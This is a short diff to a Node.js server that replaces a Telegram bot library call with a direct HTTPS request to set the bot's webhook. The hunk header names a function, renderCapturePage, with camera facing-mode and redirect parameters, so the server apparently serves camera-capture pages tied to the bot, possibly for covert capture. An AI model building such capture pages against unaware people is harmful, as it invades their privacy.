@@ -1729,16 +1729,24 @@ function renderCapturePage(res, enc_id, facing_mode, redirect_url, capture_type,
 // ==========================================
 // 10. Start Server
 // ==========================================
-
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
     writeLog(`Server started on port ${PORT}`);
-    // Set webhook for Telegram bot
-    bot.setWebhook(`${BOT_URL}/webhook/${BOT_TOKEN}`).then(() => {
-        console.log('Telegram webhook set successfully');
-        writeLog('Telegram webhook set successfully');
-    }).catch(e => {
+    
+    // Set webhook for Telegram bot via direct HTTP request
+    const https = require('https');
+    const webhookUrl = `${BOT_URL}/webhook/${BOT_TOKEN}`;
+    const apiURL = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`;
+    
+    https.get(apiURL, (res) => {
+        let data = '';
+        res.on('data', (chunk) => { data += chunk; });
+        res.on('end', () => {
+            console.log('Telegram webhook response:', data);
+            writeLog(`Telegram webhook response: ${data}`);
+        });
+    }).on('error', (e) => {
         console.error('Error setting webhook:', e.message);
         writeLog(`Error setting webhook: ${e.message}`);
     });
